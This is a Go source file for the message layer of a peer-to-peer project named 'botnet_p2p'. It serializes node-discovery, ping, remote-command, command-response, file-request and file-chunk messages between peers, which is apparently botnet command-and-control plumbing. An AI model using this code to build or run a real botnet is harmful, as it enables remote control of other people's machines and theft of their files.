package message_layer

import (
	"github.com/lampo100/botnet_p2p/models"
	"github.com/lampo100/botnet_p2p/socket_layer"
	"log"
	"github.com/golang/protobuf/proto"
)

var myNode models.Node
var messageChannel chan models.Message
var dataChannel chan []byte

var terminateChannel chan struct{}
var hasTerminated chan struct{}
var nextLayerTerminated chan struct{}

func InitLayer(selfNode models.Node, messChannel chan models.Message, terminate chan struct{}, thisTerminated chan struct{}) {
	myNode = selfNode
	messageChannel = messChannel
	terminateChannel = terminate
	hasTerminated = thisTerminated
	nextLayerTerminated = make(chan struct{})
	dataChannel = make(chan []byte)
	socket_layer.InitLayer(myNode.Port, dataChannel, terminateChannel, nextLayerTerminated)
	go messageRoutine()
	log.Println("[ML] Initialized")
}

func messageRoutine() {
	for {
		select {
		case data := <-dataChannel:
			log.Printf("[ML] Decoding message\n")
			var msg models.Message
			err := proto.Unmarshal(data, &msg)
			if err != nil {
				log.Printf("[ML] Error decoding message: %v\n", err)
				continue
			}
			log.Printf("[ML] Decoded message %v\n", msg)
			messageChannel <- msg
		case <-terminateChannel:
			<-nextLayerTerminated
			log.Println("[ML] Terminated")
			hasTerminated <- struct{}{}
			return
		}
	}
}

func createBaseMessage(sender, receiver models.Node, messageType models.Message_MessageType) models.Message {
	message := models.Message{
		Sender: &models.Message_Contact{
			Guid:  sender.Guid.String(),
			IP:    sender.Host,
			Port:  sender.Port,
			IsNAT: sender.IsNAT,
		},
		Receiver: &models.Message_Contact{
			Guid:  receiver.Guid.String(),
			IP:    receiver.Host,
			Port:  receiver.Port,
			IsNAT: receiver.IsNAT,
		},
		Type: messageType,
		Uuid: models.GenerateGUID().String(),
	}
	return message
}

func sendMessage(target models.Node, msg models.Message) error {
	bytes, err := proto.Marshal(&msg)
	if err != nil {
		return err
	}
	log.Printf("[ML] Sending message %v to %v", msg, target)
	err = socket_layer.Send(target, bytes)
	return err
}

func FindNode(receiver models.Node, guid models.UUID) error {
	message := createBaseMessage(myNode, receiver, models.Message_FIND_NODE)
	message.Payload = &models.Message_FindNode{
		FindNode: &models.Message_FindNodeMsg{
			Guid: guid.String(),
		},
	}
	return sendMessage(receiver, message)
}

func FoundNodes(receiver models.Node, nodes []models.Node) error {
	nodesMessages := make([]*models.Message_Contact, 0)

	for _, n := range nodes {
		nodesMessages = append(nodesMessages, &models.Message_Contact{
			Guid:  n.Guid.String(),
			IP:    n.Host,
			Port:  n.Port,
			IsNAT: n.IsNAT,
		})
	}

	message := createBaseMessage(myNode, receiver, models.Message_FOUND_NODES)
	message.Payload = &models.Message_FoundNodes{
		FoundNodes: &models.Message_FoundNodesMsg{
			Nodes: nodesMessages,
		},
	}
	return sendMessage(receiver, message)
}

func Ping(receiver models.Node) error {
	message := createBaseMessage(myNode, receiver, models.Message_PING)
	return sendMessage(receiver, message)
}

func PingResponse(receiver models.Node) error {
	message := createBaseMessage(myNode, receiver, models.Message_PING_RESPONSE)
	return sendMessage(receiver, message)
}

func LeaveNetwork(receiver models.Node) error {
	message := createBaseMessage(myNode, receiver, models.Message_LEAVE)
	return sendMessage(receiver, message)
}

func Command(target models.Node, command string, shouldRespond bool) error {
	message := createBaseMessage(myNode, target, models.Message_COMMAND)
	message.Payload = &models.Message_Command{
		Command: &models.Message_CommandMsg{
			Command: command,
			ShouldRespond:  shouldRespond,
		},
	}
	return sendMessage(target, message)
}

func CommandResponse(target models.Node, command, response string) error {
	message := createBaseMessage(myNode, target, models.Message_COMMAND_RESPONSE)
	message.Payload = &models.Message_Response{
		Response: &models.Message_CommandResponseMsg{
			Value: response,
		},
	}
	return sendMessage(target, message)
}

func FileChunk(target models.Node, uuid models.UUID, name string, size, number uint32, data []byte) error {
	message := createBaseMessage(myNode, target, models.Message_FILE_CHUNK)
	message.Payload = &models.Message_FileChunk{
		FileChunk: &models.Message_FileChunkMsg{
			Uuid: uuid.String(),
			FileName: name,
			FileSize: size,
			Ordinal: uint32(number),
			Data: data,
		},
	}
	return sendMessage(target, message)
}


func RequestFile(target models.Node, path string) error {
	message := createBaseMessage(myNode, target, models.Message_FILE_REQUEST)
	message.Payload = &models.Message_FileRequest{
		FileRequest: &models.Message_FileRequestMsg{
			Path:path,
		},
	}
	return sendMessage(target, message)
}

func SendMarshaledMessage(target models.Node, msg models.Message) {
	sendMessage(target, msg)
}